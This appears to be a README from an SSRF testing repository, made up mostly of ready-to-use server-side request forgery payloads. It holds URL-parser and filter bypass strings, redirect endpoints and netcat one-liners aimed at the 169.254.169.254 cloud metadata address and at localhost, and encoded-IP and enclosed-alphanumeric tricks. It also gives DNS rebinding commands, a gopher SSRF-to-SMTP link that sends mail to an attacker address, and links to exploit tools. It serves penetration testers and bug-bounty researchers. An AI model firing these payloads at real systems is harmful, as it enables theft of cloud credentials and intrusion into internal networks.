<a href="https://www.buymeacoffee.com/cujanovic" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>


[I'm grateful for the support received by Tuta](https://tuta.com/)


# SSRF (Server Side Request Forgery) testing resources

***

### Quick URL based bypasses:
`http://google.com:80+&@127.88.23.245:22/#+@google.com:80/`

`http://127.88.23.245:22/+&@google.com:80#+@google.com:80/`

`http://google.com:80+&@google.com:80#+@127.88.23.245:22/`

`http://127.88.23.245:22/?@google.com:80/`

`http://127.88.23.245:22/#@www.google.com:80/`

`http://google.com:80\\@127.88.23.245:22/`

***

### htaccess - redirect test for various cases
Status codes: 300, 301, 302, 303, 305, 307, 308

Filetypes: jpg, json, csv, xml, pdf
#### Live demo:
jpg 301 response without and with a valid response body:

`https://ssrf.localdomain.pw/img-without-body/301-http-169.254.169.254:80-.i.jpg`

`https://ssrf.localdomain.pw/img-without-body-md/301-http-.i.jpg`

`https://ssrf.localdomain.pw/img-with-body/301-http-169.254.169.254:80-.i.jpg`

`https://ssrf.localdomain.pw/img-with-body-md/301-http-.i.jpg`


json 301 response without and with a valid response body:

`https://ssrf.localdomain.pw/json-without-body/301-http-169.254.169.254:80-.j.json`

`https://ssrf.localdomain.pw/json-without-body-md/301-http-.j.json`

`https://ssrf.localdomain.pw/json-with-body/301-http-169.254.169.254:80-.j.json`

`https://ssrf.localdomain.pw/json-with-body-md/301-http-.j.json`


csv 301 response without and with a valid response body:

`https://ssrf.localdomain.pw/csv-without-body/301-http-169.254.169.254:80-.c.csv`

`https://ssrf.localdomain.pw/csv-without-body-md/301-http-.c.csv`

`https://ssrf.localdomain.pw/csv-with-body/301-http-169.254.169.254:80-.c.csv`

`https://ssrf.localdomain.pw/csv-with-body-md/301-http-.c.csv`


xml 301 response without and with a valid response body:

`https://ssrf.localdomain.pw/xml-without-body/301-http-169.254.169.254:80-.x.xml`

`https://ssrf.localdomain.pw/xml-without-body-md/301-http-.x.xml`

`https://ssrf.localdomain.pw/xml-with-body/301-http-169.254.169.254:80-.x.xml`

`https://ssrf.localdomain.pw/xml-with-body-md/301-http-.x.xml`

pdf 301 response without and with a valid response body:

`https://ssrf.localdomain.pw/pdf-without-body/301-http-169.254.169.254:80-.p.pdf`

`https://ssrf.localdomain.pw/pdf-without-body-md/301-http-.p.pdf`

`https://ssrf.localdomain.pw/pdf-with-body/301-http-169.254.169.254:80-.p.pdf`

`https://ssrf.localdomain.pw/pdf-with-body-md/301-http-.p.pdf`

***

### custom-30x - Custom 30x responses and Location header with PHP

#### Live demo:

`https://ssrf.localdomain.pw/custom-30x/?code=332&url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json`

***

### custom-200 - Custom 200 response and Content-Location header with PHP

#### Live demo:

`https://ssrf.localdomain.pw/custom-200/?url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json`

***

### custom-201 - Custom 201 response and Location header with PHP

#### Live demo:

`https://ssrf.localdomain.pw/custom-201/?url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json`

***

### Minimal web server using netcat

`while true ; do nc -l -p 80 -c 'echo -e "HTTP/1.1 302 Found\nContent-Type: application/json\nLocation: http://169.254.169.254/\n{\"a\":\"b\"}"'; done`

`export RTSPLOCATION="http://169.254.169.254/"; while true ; do nc -l -p 554 -c 'echo -e "RTSP/1.0 301 Moved\nCSeq: 1\nLocation: $RTSPLOCATION"'; done`

***

### ip.py - Alternate IP encoding tool useful for SSRF Testing

python ip.py IP PORT WhiteListedDomain EXPORT(optional)

python ip.py 169.254.169.254 80 www.google.com

python ip.py 169.254.169.254 80 www.google.com export

***

### DNS pinning

nslookup ssrf-169.254.169.254.localdomain.pw

nslookup ssrf-cloud.localdomain.pw

http://xip.io/

nslookup 169.254.169.254.xip.io

nslookup 1ynrnhl.xip.io

nslookup www.owasp.org.1ynrnhl.xip.io

nslookup 127.127.127.127.xip.io

https://nip.io/

nslookup 169.254.169.254.nip.io

nslookup app-169-254-169-254.nip.io

nslookup owasp.org.169.254.169.254.nip.io

nslookup customer2-app-169-254-169-254.nip.io

nslookup 127.127.127.127.nip.io

***

### DNS pinning race condition

nslookup ssrf-race-169.254.169.254.localdomain.pw

***

### DNS Rebinding

pip install twised

python3 dns.py WhitelistedIP InternalIP ServerIP Port Domain

python3 dns.py 216.58.214.206 169.254.169.254 78.47.24.216 53 localdomains.pw

http://webcache.googleusercontent.com/search?q=cache:http://www.611eternity.com/DNSRebinding%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/

DNS Rebinding Exploitation Framework - https://github.com/mwrlabs/dref

***

### cloud-metadata.txt - Cloud Metadata Dictionary useful for SSRF Testing

***

### svg - SSRF with svg files

***

### ffmpeg - SSRF with ffmpeg

https://hackerone.com/reports/237381

https://hackerone.com/reports/243470

https://github.com/neex/ffmpeg-avi-m3u-xbin

https://www.blackhat.com/docs/us-16/materials/us-16-Ermishkin-Viral-Video-Exploiting-Ssrf-In-Video-Converters.pdf

https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit#slide=id.g22371f2702_0_15

***

### iframe - SSRF with html iframe + URL bypass

#### Live demo:

`http://ssrf.localdomain.pw/iframe/?proto=http&ip=127.0.0.1&port=80&url=/`

***

### Abusing Enclosed Alphanumerics

`http://169。254。169。254/`

`http://169｡254｡169｡254/`

`http://⑯⑨。②⑤④。⑯⑨｡②⑤④/`

`http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/`

`http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/`

`http://②⑧⑤②⓪③⑨①⑥⑥:80/`

`http://④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:80/`

`http://⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥:80/`

`http://⓪⓪②⑤①｡⓪⓪⓪③⑦⑥｡⓪⓪⓪⓪②⑤①｡⓪⓪⓪⓪⓪③⑦⑥:80/`

`http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]:80/`

`http://[::ⓕⓕⓕⓕ:①⑥⑨。②⑤④。⑯⑨。②⑤④]:80/`

`http://⓪ⓧⓐ⑨。⓪③⑦⑥。④③⑤①⑧:80/`

`http://⓪ⓧⓐ⑨｡⑯⑥⑧⑨⑥⑥②:80/`

`http://⓪⓪②⑤①。⑯⑥⑧⑨⑥⑥②:80/`

`http://⓪⓪②⑤①｡⓪ⓧⓕⓔ｡④③⑤①⑧:80/`

***

### commonly-open-ports.txt - list of commonly open ports

***

### SSRF2SMTP

https://ssrf.localdomain.pw/ssrf2smtp/?proto=gopher&ip=0&port=25&domain=domain.com&to=email@attacker.com&code=301

***

### Schemes-List.xlsx - 800 of known schemas + useful references

https://github.com/irsdl/OutlookLeakTest/blob/master/Schemes-List.xlsx?raw=true

***

### Java/Python FTP Injections Allow for Firewall Bypass

http://webcache.googleusercontent.com/search?q=cache:http://blog.blindspotsecurity.com/2017/02/advisory-javapython-ftp-injections.html

https://github.com/ecbftw/poc/blob/master/java-python-ftp-injection/ftp-injection-server.py

http://webcache.googleusercontent.com/search?q=cache:https://shiftordie.de/blog/2017/02/18/smtp-over-xxe/

***

### SSRF + Gopher + Redis

http://webcache.googleusercontent.com/search?q=cache:http://vinc.top/2016/11/24/%E3%80%90ssrf%E3%80%91ssrfgopher%E6%90%9E%E5%AE%9A%E5%86%85%E7%BD%91%E6%9C%AA%E6%8E%88%E6%9D%83redis/

https://webcache.googleusercontent.com/search?q=cache:http://antirez.com/news/96

***

### Top 5 features that are often prone to SSRF vulnerabilities:

https://webcache.googleusercontent.com/search?q=cache:https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF

***

### Joshua Maddux - When TLS Hacks You

https://www.youtube.com/watch?v=qGpAJxfADjo

https://github.com/jmdx/TLS-poison

***

### AppSecEU15-Server_side_browsing_considered_harmful.pdf
https://www.youtube.com/watch?v=8t5-A4ASTIU

***

### us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
https://www.youtube.com/watch?v=D1S-G8rJrEk

***

### A tiny and cute URL fuzzer

https://github.com/orangetw/Tiny-URL-Fuzzer

***

### Bypassing Server-Side Request Forgery filters by abusing a bug in Ruby's native resolver

https://edoverflow.com/2017/ruby-resolv-bug/

https://hackerone.com/reports/287245

https://hackerone.com/reports/215105

0177.1 => 127.0.0.1

0x7f.1 => 127.0.0.1

127.1 => 127.0.0.1

***

### AWS bypass only

http://instance-data/latest/meta-data/

***

### SSRF Tips
http://webcache.googleusercontent.com/search?q=cache:http://blog.safebuff.com/2016/07/03/SSRF-Tips/

***

### PHP SSRF Techniques
https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51

***

### SSRF bible
https://docs.google.com/document/d/1v1TkWZtrhzRLy0bYXBcdLUedXGb9njTNIJXa3u9akHM

***

### SSRF Proxy
https://github.com/bcoles/ssrf_proxy

SSRF Proxy facilitates tunneling HTTP communications through servers vulnerable to Server-Side Request Forgery

***

### SSRF via Request Splitting

https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/

***

### Overly Permissive Proxy
https://www.nginx.com/blog/trust-no-one-perils-of-trusting-user-input/

curl http://remote-ip-address/latest/meta-data/ -H "Host: 169.154.169.254"

***

### All you need to know about SSRF and how may we write tools to do auto-detect
https://medium.com/bugbountywriteup/the-design-and-implementation-of-ssrf-attack-framework-550e9fda16ea

***

### Gopherus - This tool generates gopher link for doing SSRF and RCE in various servers
https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/

***

### A Glossary of Blind SSRF Chains
https://blog.assetnote.io/2021/01/13/blind-ssrf-chains/

***

<a href="https://www.buymeacoffee.com/cujanovic" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>
